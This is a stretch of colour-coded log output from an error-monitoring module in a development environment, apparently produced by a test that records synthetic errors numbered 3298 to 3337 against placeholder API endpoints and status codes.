WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.864838Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m66[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3298'[0m [36merror_type[0m=[35merror_type_48[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_98[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m498[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.864887Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m66[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3299'[0m [36merror_type[0m=[35merror_type_49[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_99[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m499[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.864936Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m67[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3300'[0m [36merror_type[0m=[35merror_type_0[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_0[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m500[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.864984Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m67[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3301'[0m [36merror_type[0m=[35merror_type_1[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_1[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m501[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.865031Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m67[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3302'[0m [36merror_type[0m=[35merror_type_2[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_2[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m502[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.865120Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m67[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3303'[0m [36merror_type[0m=[35merror_type_3[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_3[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m503[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.865195Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m67[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3304'[0m [36merror_type[0m=[35merror_type_4[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_4[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m504[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.865255Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m67[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3305'[0m [36merror_type[0m=[35merror_type_5[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_5[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m505[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.865307Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m67[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3306'[0m [36merror_type[0m=[35merror_type_6[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_6[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m506[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.865357Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m67[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3307'[0m [36merror_type[0m=[35merror_type_7[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_7[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m507[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.865406Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m67[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3308'[0m [36merror_type[0m=[35merror_type_8[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_8[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m508[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.865455Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m67[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3309'[0m [36merror_type[0m=[35merror_type_9[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_9[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m509[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.865503Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m67[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3310'[0m [36merror_type[0m=[35merror_type_10[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_10[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m510[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.865552Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m67[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3311'[0m [36merror_type[0m=[35merror_type_11[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_11[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m511[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.865600Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m67[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3312'[0m [36merror_type[0m=[35merror_type_12[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_12[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m512[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.865649Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m67[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3313'[0m [36merror_type[0m=[35merror_type_13[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_13[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m513[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.865698Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m67[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3314'[0m [36merror_type[0m=[35merror_type_14[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_14[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m514[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.865747Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m67[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3315'[0m [36merror_type[0m=[35merror_type_15[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_15[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m515[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.865800Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m67[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3316'[0m [36merror_type[0m=[35merror_type_16[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_16[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m516[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.865854Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m67[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3317'[0m [36merror_type[0m=[35merror_type_17[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_17[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m517[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.865910Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m67[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3318'[0m [36merror_type[0m=[35merror_type_18[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_18[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m518[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.865961Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m67[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3319'[0m [36merror_type[0m=[35merror_type_19[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_19[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m519[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.866011Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m67[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3320'[0m [36merror_type[0m=[35merror_type_20[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_20[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m520[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.866059Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m67[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3321'[0m [36merror_type[0m=[35merror_type_21[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_21[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m521[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.866109Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m67[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3322'[0m [36merror_type[0m=[35merror_type_22[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_22[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m522[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.866158Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m67[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3323'[0m [36merror_type[0m=[35merror_type_23[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_23[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m523[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.866232Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m67[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3324'[0m [36merror_type[0m=[35merror_type_24[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_24[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m524[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.866328Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m67[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3325'[0m [36merror_type[0m=[35merror_type_25[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_25[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m525[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.866391Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m67[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3326'[0m [36merror_type[0m=[35merror_type_26[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_26[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m526[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.866444Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m67[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3327'[0m [36merror_type[0m=[35merror_type_27[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_27[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m527[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.866498Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m67[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3328'[0m [36merror_type[0m=[35merror_type_28[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_28[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m528[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.866547Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m67[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3329'[0m [36merror_type[0m=[35merror_type_29[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_29[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m529[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.866596Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m67[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3330'[0m [36merror_type[0m=[35merror_type_30[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_30[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m530[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.866651Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m67[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3331'[0m [36merror_type[0m=[35merror_type_31[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_31[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m531[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.866703Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m67[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3332'[0m [36merror_type[0m=[35merror_type_32[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_32[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m532[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.866755Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m67[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3333'[0m [36merror_type[0m=[35merror_type_33[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_33[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m533[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.866807Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m67[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3334'[0m [36merror_type[0m=[35merror_type_34[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_34[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m534[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.866857Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m67[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3335'[0m [36merror_type[0m=[35merror_type_35[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_35[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m535[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.866936Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m67[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3336'[0m [36merror_type[0m=[35merror_type_36[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_36[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m536[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.867022Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m67[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3337'[0m [36merror_type[0m=[35merror_type_37[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_37[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m537[0m
